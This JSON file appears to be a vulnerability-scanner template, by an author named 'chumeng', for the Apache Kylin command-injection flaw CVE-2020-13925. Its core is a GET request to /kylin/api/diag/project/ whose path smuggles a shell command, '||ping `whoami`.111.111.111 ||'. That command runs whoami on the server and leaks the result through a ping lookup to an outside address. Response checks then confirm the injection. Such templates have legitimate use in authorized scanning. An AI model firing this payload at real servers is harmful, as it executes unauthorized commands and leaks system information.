{
    "Name": "apache-kylin-命令注入漏洞",
    "Description": " Apache Kylin DiagnosisController.java 命令注入漏洞 CVE-2020-13925",
    "Product": "apache",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%20%7C%7C/download",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "111.111.111"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "400"  
                 }
        ]
        },
        "Next_decide":""
                }
]}